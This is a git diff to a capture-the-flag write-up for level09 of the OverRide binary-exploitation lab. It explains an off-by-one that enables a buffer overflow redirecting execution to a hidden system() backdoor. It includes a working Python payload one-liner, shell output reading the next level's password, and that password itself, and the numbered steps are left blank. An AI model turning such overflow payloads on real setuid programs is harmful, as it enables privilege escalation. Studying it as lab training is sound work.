@@ -12,7 +12,7 @@ level09@OverRide:~$ ls -l
 -rwsr-s---+ 1 end users 12959 Oct  2  2016 level09
 ```
 
-When run it prompts user for a username, and a message which is then sent to *Unix-Dude*.
+When run it prompts user for a username, and a message which is supposedly sent to *Unix-Dude*.
 ```
 level09@OverRide:~$ ./level09
 --------------------------------------------
@@ -27,14 +27,39 @@ level09@OverRide:~$ ./level09
 level09@OverRide:~$
 ```
 
+See [disassembly notes](https://github.com/anyashuka/Override/blob/main/level09/Ressources/disassembly_notes.md) for detailed gdb assembly breakdown.
+
 ## Solution
 
+The binary simply prompts for, then copies, username and a message.
+
+Investigating with gdb we find a hidden function ```secret_backdoor()```, which reads to a buffer from stdin, then calls ```system()``` with the buffer. Obviously we would like to jump to ```secret_backdoor()``` somehow.
+
+The copy username loop has an off-by-one error, which allows the user to overwrite the ```len_message``` variable by one byte.
+
+A larger ```len_message``` than the default 140 can cause strncpy to overflow the buffer when copying the *Msg*. Can we overflow and overwrite EIP return address with the address of ```secret_backdoor()```?
 
 
 ### Build exploit
 
+So we build our exploit:
+1. username buffer until overflow - 
+2.
+3. 
 
-
-## Recreate Exploited Binary
-
-
+```
+level09@OverRide:~$ gdb -q level09
+Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
+(gdb) quit
+level09@OverRide:~$ (python -c 'print "A" * 40 + "\xd0" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"'; cat) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+whoami
+end
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+```
